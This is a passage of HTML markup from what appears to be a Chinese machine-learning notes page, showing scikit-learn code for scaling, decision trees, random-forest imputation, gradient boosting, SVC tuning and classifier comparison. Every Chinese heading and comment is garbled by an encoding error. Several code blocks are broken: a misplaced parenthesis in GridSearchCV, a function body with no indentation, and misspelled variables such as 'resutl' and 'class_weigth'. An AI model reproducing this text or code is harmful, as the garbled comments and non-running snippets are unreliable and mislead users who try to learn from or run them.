class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">col = X.columns.tolist()</span><br><span class="line">cate = X.columns[X.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line"> Â  Â col.remove(i)</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">ss = StandardScaler()</span><br><span class="line">ss = ss.fit(X.loc[:,col])</span><br><span class="line">X.loc[:,col] = ss.transform(X.loc[:,col])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br></pre></td></tr></table></figure><ul><li>è®­ç»ƒé›†ç‰¹å¾å’Œé¢„æµ‹é›†ç‰¹å¾plotä¸€ä¸‹ï¼Œçœ‹çœ‹åˆ†å¸ƒåƒä¸åƒï¼Œçœ‹çœ‹åé¢éœ€è¦é˜²æ­¢è¿‡æ‹Ÿåˆï¼Œäº¤å‰éªŒè¯ã€‚</li></ul><h2><span id="æ•°æ®é¢„å¤„ç†">æ•°æ®é¢„å¤„ç†</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è§‚å¯Ÿè¿ç»­å˜é‡ï¼Œdistplot</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">sns.distplot(dataset_raw[<span class="string">&#x27;fnlwgt&#x27;</span>])</span><br></pre></td></tr></table></figure><h2><span id="åˆ†ç±»">åˆ†ç±»</span></h2><h3><span id="å›å½’æ ‘">å›å½’æ ‘</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®ä¾‹åŒ–ä¸€ä¸ªåˆ†ç±»å™¨</span></span><br><span class="line">clf = tree.DecisionTreeClassifier()</span><br><span class="line"><span class="comment"># è®­ç»ƒ</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># è¯„ä»·ç»“æœ</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­¦ä¹ æ›²çº¿</span></span><br><span class="line">n = np.linspace(<span class="number">5</span>,<span class="number">16</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    clf = DecisionTreeClassifier(max_depth=i)</span><br><span class="line">    score.append(cross_val_score(clf,X,y,cv=<span class="number">10</span>).mean())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), <span class="built_in">int</span>(n[score.index(<span class="built_in">max</span>(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘æ ¼æœç´¢</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">&quot;criterion&quot;</span>:(<span class="string">&#x27;gini&#x27;</span>,<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line">    ,<span class="string">&quot;splitter&quot;</span>:(<span class="string">&#x27;best&#x27;</span>,<span class="string">&#x27;random&#x27;</span>)</span><br><span class="line">    ,<span class="string">&#x27;max_depth&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_samples_leaf&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_impurity_decrease&#x27;</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br></pre></td></tr></table></figure><h3><span id="éšæœºæ£®æ—">éšæœºæ£®æ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># å¡«è¡¥ç¼ºå¤±</span></span><br><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().<span class="built_in">sum</span>(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ„å»ºæˆ‘ä»¬çš„æ–°ç‰¹å¾çŸ©é˜µå’Œæ–°æ ‡ç­¾</span></span><br><span class="line"> Â  Â df = X_missing_reg</span><br><span class="line"> Â  Â fillc = df.iloc[:,i]</span><br><span class="line"> Â  Â df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#åœ¨æ–°ç‰¹å¾çŸ©é˜µä¸­ï¼Œå¯¹å«æœ‰ç¼ºå¤±å€¼çš„åˆ—ï¼Œè¿›è¡Œ0çš„å¡«è¡¥</span></span><br><span class="line"> Â  Â df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â strategy=<span class="string">&#x27;constant&#x27;</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ‰¾å‡ºæˆ‘ä»¬çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span></span><br><span class="line"> Â  Â Ytrain = fillc[fillc.notnull()]</span><br><span class="line"> Â  Â Ytest = fillc[fillc.isnull()]</span><br><span class="line"> Â  Â Xtrain = df_0[Ytrain.index,:]</span><br><span class="line"> Â  Â Xtest = df_0[Ytest.index,:]</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#ç”¨éšæœºæ£®æ—å›å½’æ¥å¡«è¡¥ç¼ºå¤±å€¼</span></span><br><span class="line"> Â  Â rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line"> Â  Â rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line"> Â  Â Ypredict = rfc.predict(Xtest)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#å°†å¡«è¡¥å¥½çš„ç‰¹å¾è¿”å›åˆ°æˆ‘ä»¬çš„åŸå§‹çš„ç‰¹å¾çŸ©é˜µä¸­</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br></pre></td></tr></table></figure><h3><span id="æ¢¯åº¦æå‡æ£®æ—">æ¢¯åº¦æå‡æ£®æ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gbc = GradientBoostingClassifier().fit(Xtrain,Ytrain)</span><br><span class="line">gbc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­¦ä¹ æ›²çº¿</span></span><br><span class="line">%%time</span><br><span class="line">n = np.linspace(<span class="number">329</span>,<span class="number">339</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    gbc = GradientBoostingClassifier(n_estimators=<span class="built_in">int</span>(i)).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(gbc.score(Xtest,Ytest))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), <span class="built_in">int</span>(n[score.index(<span class="built_in">max</span>(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3><span id="svcæ”¯æŒå‘é‡æœºéœ€è¦æ ‡å‡†åŒ–-æ‰¾å°‘æ•°ç±»ç›¸å¯¹æ“…é•¿">SVC(æ”¯æŒå‘é‡æœºéœ€è¦æ ‡å‡†åŒ–) æ‰¾å°‘æ•°ç±»ç›¸å¯¹æ“…é•¿</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">X = StandardScaler().fit_transform(X)<span class="comment">#å°†æ•°æ®è½¬åŒ–ä¸º0,1æ­£æ€åˆ†å¸ƒ</span></span><br><span class="line"></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X,y,test_size=<span class="number">0.3</span>,random_state=<span class="number">420</span>)</span><br><span class="line"> </span><br><span class="line">Kernel = [<span class="string">&quot;linear&quot;</span>,<span class="string">&quot;poly&quot;</span>,<span class="string">&quot;rbf&quot;</span>,<span class="string">&quot;sigmoid&quot;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> kernel <span class="keyword">in</span> Kernel:</span><br><span class="line">    clf= SVC(kernel = kernel</span><br><span class="line">             , gamma=<span class="string">&quot;auto&quot;</span></span><br><span class="line">             , degree = <span class="number">1</span></span><br><span class="line">             , cache_size=<span class="number">5000</span></span><br><span class="line">            ).fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The accuracy under kernel %s is %f&quot;</span> % (kernel,clf.score(Xtest,Ytest)))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># è°ƒè¯•rbf</span></span><br><span class="line">score = []</span><br><span class="line">gamma_range = np.logspace(-<span class="number">10</span>, <span class="number">1</span>, <span class="number">50</span>) <span class="comment">#è¿”å›åœ¨å¯¹æ•°åˆ»åº¦ä¸Šå‡åŒ€é—´éš”çš„æ•°å­—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> gamma_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,gamma = i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), gamma_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(gamma_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘æ ¼æœç´¢rbf</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> StratifiedShuffleSplit<span class="comment">#ç”¨äºæ”¯æŒå¸¦äº¤å‰éªŒè¯çš„ç½‘æ ¼æœç´¢</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV<span class="comment">#å¸¦äº¤å‰éªŒè¯çš„ç½‘æ ¼æœç´¢</span></span><br><span class="line"> </span><br><span class="line">time0 = time()</span><br><span class="line"> </span><br><span class="line">gamma_range = np.logspace(-<span class="number">10</span>,<span class="number">1</span>,<span class="number">20</span>)</span><br><span class="line">coef0_range = np.linspace(<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">param_grid = <span class="built_in">dict</span>(gamma = gamma_range</span><br><span class="line">                  ,coef0 = coef0_range)</span><br><span class="line">cv = StratifiedShuffleSplit(n_splits=<span class="number">5</span>, test_size=<span class="number">0.3</span>, random_state=<span class="number">420</span>)<span class="comment">#å°†æ•°æ®åˆ†ä¸º5ä»½ï¼Œ5ä»½æ•°æ®ä¸­æµ‹è¯•é›†å 30%</span></span><br><span class="line">grid = GridSearchCV(SVC(kernel = <span class="string">&quot;poly&quot;</span>,degree=<span class="number">1</span>,cache_size=<span class="number">5000</span></span><br><span class="line">                        ,param_grid=param_grid</span><br><span class="line">                        ,cv=cv)</span><br><span class="line">grid.fit(X, y)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The best parameters are %s with a score of %0.5f&quot;</span> % (grid.best_params_, </span><br><span class="line">grid.best_score_))</span><br><span class="line"><span class="built_in">print</span>(time()-time0)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#è°ƒçº¿æ€§æ ¸å‡½æ•°</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>,C=i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ¢rbf</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,C=i,gamma = <span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#è¿›ä¸€æ­¥ç»†åŒ–</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">5</span>,<span class="number">7</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,C=i,gamma = </span><br><span class="line"><span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#è§£å†³æ ·æœ¬ä¸å‡è¡¡  class_weightï¼ˆä¸€èˆ¬æ¯”è¾ƒå°‘ç”¨ï¼Œè¯¯ä¼¤ä¸¥é‡ï¼‰</span></span><br><span class="line"><span class="comment">#è®¾å®šclass_weight</span></span><br><span class="line">wclf = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>, class_weight=&#123;<span class="number">1</span>: <span class="number">10</span>&#125;)</span><br><span class="line">wclf.fit(X, y)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment"># å¬å›ç‡</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_auc_score, recall_score</span><br><span class="line">resutl = clf.predict(Xtest)</span><br><span class="line">recall = recall_score(Ytest,result)                    </span><br><span class="line"><span class="comment"># æé«˜å¬å›ç‡</span></span><br><span class="line">class_weight = &#123;<span class="number">1</span>:<span class="number">10</span>&#125; <span class="comment"># ç±»åˆ«ï¼šæƒé‡</span></span><br><span class="line"><span class="comment"># å¹³è¡¡</span></span><br><span class="line">class_weigth =<span class="string">&#x27;balanced&#x27;</span></span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line"><span class="comment"># è°ƒå‚</span></span><br><span class="line">irange = np.linspace(<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> irange:</span><br><span class="line"> Â  Â times = time()</span><br><span class="line"> Â  Â clf = SVC(kernel = <span class="string">&quot;linear&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,gamma=<span class="string">&quot;auto&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,cache_size = <span class="number">5000</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,class_weight = &#123;<span class="number">1</span>:<span class="number">1</span>+i&#125;</span><br><span class="line"> Â  Â  Â  Â  Â  Â  ).fit(Xtrain, Ytrain)</span><br><span class="line"> Â  Â result = clf.predict(Xtest)</span><br><span class="line"> Â  Â score = clf.score(Xtest,Ytest)</span><br><span class="line"> Â  Â recall = recall_score(Ytest, result)</span><br><span class="line"> Â  Â auc = roc_auc_score(Ytest,clf.decision_function(Xtest))</span><br><span class="line"> Â  Â <span class="built_in">print</span>(<span class="string">&quot;under ratio 1:%f testing accuracy %f, recall is %f&#x27;, auc is %f&quot;</span> % (<span class="number">1</span>+i,score,recall,auc))</span><br><span class="line"> Â  Â <span class="built_in">print</span>(datetime.datetime.fromtimestamp(time()-times).strftime(<span class="string">&quot;%M:%S:%f&quot;</span>))                    </span><br></pre></td></tr></table></figure><h3><span id="åˆ†ç±»onekey">åˆ†ç±»OneKey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,RidgeClassifier,SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier,GradientBoostingClassifier,AdaBoostClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC,LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=&#123;&#125;</span>):</span><br><span class="line">    models[<span class="string">&#x27;LogisticRegression&#x27;</span>]=LogisticRegression()</span><br><span class="line">    models[<span class="string">&#x27;RidgeClassifier&#x27;</span>]=RidgeClassifier()</span><br><span class="line">    models[<span class="string">&#x27;SGDClassifier&#x27;</span>]=SGDClassifier()</span><br><span class="line">    models[<span class="string">&#x27;RandomForestClassifier&#x27;</span>]=RandomForestClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GradientBoostingClassifier&#x27;</span>]=GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">&#x27;AdaBoostClassifier&#x27;</span>]=AdaBoostClassifier()</span><br><span class="line">    models[<span class="string">&#x27;KNN&#x27;</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GaussianNB&#x27;</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">&#x27;SVC&#x27;</span>]=SVC()</span><br><span class="line">    models[<span class="string">&#x27;LinearSVC&#x27;</span>]=LinearSVC()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipe</span>(<span class="params">model</span>):</span><br><span class="line">    s = [(<span class="string">&#x27;MinMaxScaler&#x27;</span>,MinMaxScaler()),(<span class="string">&#x27;model&#x27;</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps=s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pred</span>(<span class="params">model,x</span>):</span><br><span class="line">    <span class="keyword">return</span> model.predict(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">model,x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> model.fit(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">model,x,y,cv=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,x,y,cv=cv)</span><br><span class="line"></span><br><span class="line">s=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    pipe = make_pipe(m)</span><br><span class="line">    s[n] = valid(pipe,x,y).mean()</span><br><span class="line">    </span><br><span class="line">order = <span class="built_in">sorted</span>(s.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,X, Y</span>):</span><br><span class="line">steps = <span class="built_in">list</span>()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps)</span><br><span class="line"><span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,X,Y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="åˆ†ç±»è°ƒå‚onekey">åˆ†ç±»è°ƒå‚Onekey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 